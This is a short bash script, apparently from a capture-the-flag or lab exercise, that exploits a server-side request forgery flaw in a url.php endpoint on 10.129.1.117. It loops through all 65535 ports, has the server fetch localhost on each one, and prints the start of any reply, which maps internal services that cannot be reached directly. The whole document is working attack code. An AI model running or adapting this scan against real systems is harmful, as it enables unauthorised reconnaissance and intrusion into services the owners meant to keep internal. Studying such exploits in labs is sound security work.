#!/bin/bash

for i in {0..65535}; do 
  res=$(curl -s http://10.129.1.117:60000/url.php?path=http://localhost:${i});
  len=$(echo $res | wc -w); 
  if [ "$len" -gt "0" ]; then
    echo -n "${i}: "; 
    echo $res | tr -d "\r" | head -1 | cut -c-100; 
  fi;
done